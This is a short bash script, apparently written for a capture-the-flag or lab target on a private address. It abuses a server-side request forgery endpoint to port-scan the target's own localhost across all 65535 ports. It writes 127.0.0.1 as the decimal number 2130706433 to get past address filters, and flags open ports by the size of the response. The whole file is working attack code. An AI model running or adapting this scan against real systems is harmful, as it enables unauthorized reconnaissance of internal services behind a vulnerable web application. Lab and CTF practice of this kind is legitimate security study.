#!/usr/bin/env bash
outfile="ports.txt"

cat /dev/null > ports.txt

for x in {1..65535};
    do cmd=$(curl -so /dev/null http://10.10.106.111:8000/attack?url=http://2130706433:${x} \
        -w '%{size_download}');
    if [ $cmd != 1045 ]; then
        echo "$x" >> $outfile
        echo "Open port: $x"
    fi
done

echo "There are $(wc -l < $outfile) ports open."
